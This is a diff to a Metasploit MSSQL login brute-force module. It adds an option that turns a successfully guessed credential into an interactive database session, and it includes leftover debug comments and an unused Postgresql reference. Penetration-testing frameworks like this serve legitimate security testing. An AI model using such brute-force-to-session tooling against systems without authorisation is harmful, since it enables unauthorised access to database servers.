@@ -10,6 +10,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::CommandShell
 
   include Msf::Auxiliary::Scanner
 
@@ -69,7 +70,8 @@ class MetasploitModule < Msf::Auxiliary
         ssl_verify_mode: datastore['SSLVerifyMode'],
         ssl_cipher: datastore['SSLCipher'],
         local_port: datastore['CPORT'],
-        local_host: datastore['CHOST']
+        local_host: datastore['CHOST'],
+        use_client_as_proof: datastore['CreateSession']
     )
 
     scanner.scan! do |result|
@@ -84,10 +86,52 @@ class MetasploitModule < Msf::Auxiliary
         create_credential_login(credential_data)
 
         print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
+        if datastore['CreateSession']
+          begin
+            socket = result.proof
+            session_setup(socket, result)
+          rescue ::StandardError => e
+            elog('Failed: ', error: e)
+          end
+        end
       else
         invalidate_login(credential_data)
         vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
       end
     end
+  end
+
+  def session_setup(socket, result)
+    return unless (socket)
+
+    #require 'pry-byebug'; binding.pry;
+
+    # platform = 'MacOS' # scanner.get_platform(client)
+    # TODO: Add 'dispatcher' to MSSQL client
+    #rstream = client.dispatcher.tcp_socket
+    rstream = socket
+
+
+    begin
+      ::Msf::Sessions::Postgresql
+    rescue ::StandardError => _e
+
+    end
+
+    mssql_session = ::Msf::Sessions::MSSQL.new(rstream, {})
+
+    merging = {
+      'USERPASS_FILE' => nil,
+      'USER_FILE'     => nil,
+      'PASS_FILE'     => nil,
+      'USERNAME'      => result.credential.public,
+      'PASSWORD'      => result.credential.private
+    }
+
+    s = start_session(self, nil, merging, false, mssql_session.rstream, mssql_session)
+
+    # s.platform = platform
+
+    s
   end
 end
